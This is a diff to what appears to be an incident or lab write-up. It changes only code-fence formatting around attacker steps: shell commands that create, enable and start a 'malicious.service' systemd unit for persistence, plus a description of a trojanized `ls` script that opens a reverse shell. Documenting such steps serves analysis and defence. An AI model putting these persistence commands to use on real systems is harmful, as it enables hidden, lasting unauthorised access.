@@ -7,7 +7,7 @@
 1. Downloaded and installed a **malicious systemd service** to ensure the backdoor would automatically start on system reboot.
 - The service was configured to run a reverse shell or malicious command to maintain access after rebooting the system.
 
-`# Create a malicious systemd service that will ensure persistence by executing a reverse shell
+```# Create a malicious systemd service that will ensure persistence by executing a reverse shell
 echo '[Unit]
 Description=Malicious Service
 After=network.target
@@ -22,7 +22,8 @@ WantedBy=multi-user.target' > /etc/systemd/system/malicious.service
 
 # Enable and start the malicious service
 sudo systemctl enable malicious.service
-sudo systemctl start malicious.service`
+sudo systemctl start malicious.service
+```
 
 2. Replaced the legitimate `ls` command with a Trojanized script located at `/home/baddog/.local/bin/ls`.
 - This Trojanized script was designed to execute a reverse shell when invoked, providing continued access to the system without raising suspicion.
